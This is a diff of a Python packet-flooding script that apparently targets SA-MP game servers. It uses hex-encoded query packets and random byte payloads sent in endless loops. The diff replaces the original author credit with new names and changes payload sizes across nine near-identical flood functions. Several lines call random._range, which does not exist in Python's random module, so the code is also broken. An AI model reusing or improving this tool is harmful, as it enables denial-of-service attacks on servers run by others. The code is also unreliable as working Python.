@@ -1,5 +1,5 @@
-#AUTHOR : Fadil X TANGAN COLI
-#SUBSCRIBE Fadil
+#AUTHOR : PlanetsRocky999
+#DEVELOPER : PlanetsRocky404
 import random
 import threading
 import codecs
@@ -95,13 +95,11 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        
 def xxxxxxxxx():
   data = random._urandom(881)
-  data = random._range(21000)
+  data = random._range(911)
   L_bytes = random._range(11000)
-  L_bytes = random._urandom(41000)
+  L_bytes = random._urandom(9100)
   I_bytes = random._urandom(91100)
   l_bytes = random._range(110)
-  threads = random._range(110)
-  times = random._range(110)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
@@ -119,9 +117,7 @@ def xxxxxxxx():
   L_bytes = random._range(11000)
   L_bytes = random._urandom(41000)
   I_bytes = random._urandom(91100)
-  l_bytes = random._range(110)
-  threads = random._range(110)
-  times = random._range(110)
+  l_bytes = random._range(91100)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
@@ -140,8 +136,6 @@ def xxxxxxx():
   L_bytes = random._urandom(41000)
   I_bytes = random._urandom(91100)
   l_bytes = random._range(110)
-  threads = random._range(110)
-  times = random._range(110)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
@@ -160,8 +154,6 @@ def xxxxxx():
   L_bytes = random._urandom(41000)
   I_bytes = random._urandom(91100)
   l_bytes = random._range(110)
-  threads = random._range(110)
-  times = random._range(110)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
@@ -180,8 +172,6 @@ def xxxxx():
   L_bytes = random._urandom(41000)
   I_bytes = random._urandom(91100)
   l_bytes = random._range(110)
-  threads = random._range(110)
-  times = random._range(110)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
@@ -200,8 +190,6 @@ def xxxx():
   L_bytes = random._urandom(41000)
   I_bytes = random._urandom(91100)
   l_bytes = random._range(110)
-  threads = random._range(110)
-  times = random._range(110)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
@@ -220,8 +208,6 @@ def xxx():
   L_bytes = random._range(110)
   I_bytes = random._urandom(91100)
   I_bytes = random._range(11000)
-  threads = random._range(1100)
-  times = random._range(1100)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
@@ -240,8 +226,6 @@ def xx():
   L_bytes = random._range(110)
   I_bytes = random._urandom(91100)
   I_bytes = random._range(11000)
-  threads = random._range(1100)
-  times = random._range(1100)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
@@ -262,8 +246,6 @@ def x():
   L_bytes = random._range(110)
   I_bytes = random._urandom(91100)
   I_bytes = random._range(11000)
-  threads = random._range(1100)
-  times = random._range(1100)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
